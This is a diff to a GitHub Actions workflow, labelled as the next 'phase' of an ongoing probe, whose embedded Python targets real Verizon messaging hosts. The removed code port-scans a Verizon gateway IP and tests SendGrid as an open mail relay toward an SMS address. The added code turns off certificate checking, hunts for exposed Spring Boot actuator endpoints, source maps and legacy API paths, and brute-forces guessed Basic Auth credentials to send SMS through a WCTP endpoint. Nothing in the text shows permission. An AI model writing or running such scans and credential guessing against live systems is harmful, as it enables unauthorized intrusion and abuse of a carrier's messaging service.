@@ -1,105 +1,117 @@
-name: EMAG Phase 13
+name: EMAG Phase 14
 on:
   workflow_dispatch:
   push:
     branches: [main]
 
 jobs:
-  phase13:
+  phase14:
     runs-on: ubuntu-latest
     timeout-minutes: 10
     steps:
-      - name: EMAG Phase 13
+      - name: EMAG Phase 14
         run: |
           python3 - << 'PYEOF'
-          import socket, ssl, urllib.request, urllib.error, json, subprocess, re, time
+          import urllib.request, urllib.error, json, ssl, base64
           ctx = ssl.create_default_context()
           ctx.check_hostname = False
           ctx.verify_mode = ssl.CERT_NONE
+          BASE = "https://ess.emag.verizonwireless.com"
           
-          print("=== gateway.verizonenterprise.com probe ===")
-          gw_ip = "23.209.84.155"
-          print(f"IP: {gw_ip}")
-          for port in [80, 443, 8080, 8443, 25, 587, 2775, 9080, 9443]:
-              try:
-                  s = socket.socket()
-                  s.settimeout(5)
-                  s.connect((gw_ip, port))
-                  if port in [443, 8443]:
-                      sc = ctx.wrap_socket(s, server_hostname="gateway.verizonenterprise.com")
-                      sc.sendall(b"GET / HTTP/1.0\r\nHost: gateway.verizonenterprise.com\r\n\r\n")
-                      d = sc.recv(512).decode(errors="replace")
-                      sc.close()
-                  elif port in [80, 8080]:
-                      s.sendall(b"GET / HTTP/1.0\r\nHost: gateway.verizonenterprise.com\r\n\r\n")
-                      d = s.recv(512).decode(errors="replace")
-                      s.close()
-                  else:
-                      d = s.recv(512).decode(errors="replace")
-                      s.close()
-                  print(f"[OPEN:{port}]: {d[:100]}")
-              except Exception as e:
-                  print(f"[{port}]: {str(e)[:60]}")
-          
-          print()
-          print("=== gateway.verizonenterprise.com HTTPS ===")
-          for path in ["/", "/emag", "/api", "/sms", "/gateway"][:]:
-              rq = urllib.request.Request("https://gateway.verizonenterprise.com" + path,
-                  headers={"User-Agent": "Mozilla/5.0", "Host": "gateway.verizonenterprise.com"})
+          def get(url, hdrs=None, meth="GET", body=None, maxb=4096):
+              h = {"User-Agent": "Mozilla/5.0"}
+              if hdrs: h.update(hdrs)
+              data = body.encode() if isinstance(body, str) else body
+              rq = urllib.request.Request(url, data=data, headers=h, method=meth)
               try:
                   op = urllib.request.build_opener(urllib.request.HTTPSHandler(context=ctx))
                   with op.open(rq, timeout=10) as r:
-                      ct = r.headers.get("Content-Type", "")
-                      print(f"[{r.status}] {path} ct={ct[:40]}: {r.read(200).decode(errors=chr(114)+chr(101)+chr(112)+chr(108)+chr(97)+chr(99)+chr(101))[:150]}")
+                      return r.status, r.read(maxb).decode(errors="replace")
               except urllib.error.HTTPError as e:
-                  loc = e.headers.get("Location", "")
-                  print(f"[{e.code}] {path} loc={loc[:100]}")
+                  return e.code, e.read(512).decode(errors="replace")
               except Exception as e:
-                  print(f"[ERR] {path}: {e}")
+                  return 0, str(e)
           
-          print()
-          print("=== SendGrid open relay test (no auth) ===")
-          try:
-              s = socket.socket()
-              s.settimeout(10)
-              s.connect(("smtp.sendgrid.net", 25))
-              print("Banner:", s.recv(512).decode(errors="replace")[:100])
-              def cmd(sock, c):
-                  sock.sendall((c + "\r\n").encode())
-                  time.sleep(0.5)
-                  return sock.recv(4096).decode(errors="replace")
-              print("EHLO:", cmd(s, "EHLO gha.local"))
-              r1 = cmd(s, "MAIL FROM:<noreply@pentest.local>")
-              print("MAIL FROM:", r1[:80])
-              if r1[:1] == "2":
-                  r2 = cmd(s, "RCPT TO:<12283359820@vtext.com>")
-                  print("RCPT1:", r2[:80])
+          print("=== VMG legacy paths ===")
+          for path in [
+              "/vmg/",
+              "/vmg/api/messages",
+              "/vmg/wctp",
+              "/vmg/api/reports",
+              "/vmg/auth/business/login",
+              "/vmg/assets/js/",
+          ]:
+              s, b = get(BASE + path)
+              is_html = "<html" in b[:100].lower()
+              if s == 403 or (s == 200 and not is_html):
+                  print(f"[{s}] INTERESTING {path}: {b[:200]}")
               else:
-                  print("Relay denied at MAIL FROM")
-              s.close()
-          except Exception as ex:
-              print(f"SendGrid error: {ex}")
+                  print(f"[{s}] {path} (html={is_html})")
           
           print()
-          print("=== ess.emag.verizonwireless.com DNS deep ===")
-          r = subprocess.run(["host", "-a", "ess.emag.verizonwireless.com"], capture_output=True, text=True, timeout=10)
-          print("ALL records:", r.stdout.strip()[:500])
-          r2 = subprocess.run(["nslookup", "ess.emag.verizonwireless.com"], capture_output=True, text=True, timeout=10)
-          print("nslookup:", r2.stdout.strip()[:300])
+          print("=== Spring Boot Actuator ===")
+          for path in [
+              "/actuator",
+              "/actuator/",
+              "/actuator/health",
+              "/actuator/info",
+              "/actuator/env",
+              "/actuator/beans",
+              "/emag/actuator",
+              "/emag/actuator/health",
+              "/emag/actuator/info",
+              "/emag/actuator/env",
+              "/emag/actuator/beans",
+              "/emag/actuator/mappings",
+          ]:
+              s, b = get(BASE + path)
+              if s != 404:
+                  print(f"[{s}] {path}: {b[:200]}")
+              else:
+                  print(f"[{s}] {path}")
           
           print()
-          print("=== vtext.com: try low-priority MX (smtpin01) ===")
-          try:
-              mx1_ip = socket.gethostbyname("smtpin01.vzw.a.cloudfilter.net")
-              print(f"smtpin01 IP: {mx1_ip}")
-              s3 = socket.socket()
-              s3.settimeout(10)
-              s3.connect((mx1_ip, 25))
-              banner3 = s3.recv(512).decode(errors="replace")
-              print(f"Banner: {banner3[:100]}")
-              s3.close()
-          except Exception as e3:
-              print(f"smtpin01: {e3}")
+          print("=== JS Source Maps ===")
+          for path in [
+              "/emag/assets/js/open/landing.js.map",
+              "/emag/assets/js/open/landing_services.js.map",
+              "/emag/assets/js/backbone-concat.js.map",
+              "/emag/assets/css/emag-modern.css.map",
+              "/emag/assets/css/backbone-concat.css.map",
+          ]:
+              s, b = get(BASE + path)
+              if s == 200:
+                  print(f"[FOUND] {path}: {b[:300]}")
+              else:
+                  print(f"[{s}] {path}")
+          
+          print()
+          print("=== WCTP with Basic Auth ===")
+          wctp = ("<?xml version=\"1.0\"?>"
+              "<wctp-Operation wctpVersion=\"WCTP-DTD-V1r1\">"
+              "<wctp-SubmitRequest>"
+              "<wctp-SubmitHeader submitID=\"1\">"
+              "<wctp-Originator senderID=\"12345\" securityCode=\"test\"/>"
+              "<wctp-Recipient recipientID=\"+12283359820\"/>"
+              "</wctp-SubmitHeader>"
+              "<wctp-Payload><wctp-AlphanumericMessage>test</wctp-AlphanumericMessage></wctp-Payload>"
+              "</wctp-SubmitRequest>"
+              "</wctp-Operation>")
+          for sid, pwd in [("12345","test"), ("99999","pass"), ("test","test"), ("emag","emag")][:]:
+              cred = base64.b64encode(f"{sid}:{pwd}".encode()).decode()
+              s, b = get(BASE + "/emag/wctp",
+                  hdrs={"Authorization": f"Basic {cred}", "Content-Type": "text/xml"},
+                  meth="POST", body=wctp)
+              print(f"[{s}] WCTP BasicAuth {sid}:{pwd}: {b[:150]}")
+          
+          print()
+          print("=== Robots.txt and sitemap ===")
+          for path in ["/robots.txt", "/sitemap.xml", "/emag/robots.txt", "/emag/sitemap.xml"][:]:
+              s, b = get(BASE + path, maxb=2048)
+              if s == 200:
+                  print(f"[{s}] {path}: {b[:500]}")
+              else:
+                  print(f"[{s}] {path}")
           
           print("DONE")
           PYEOF
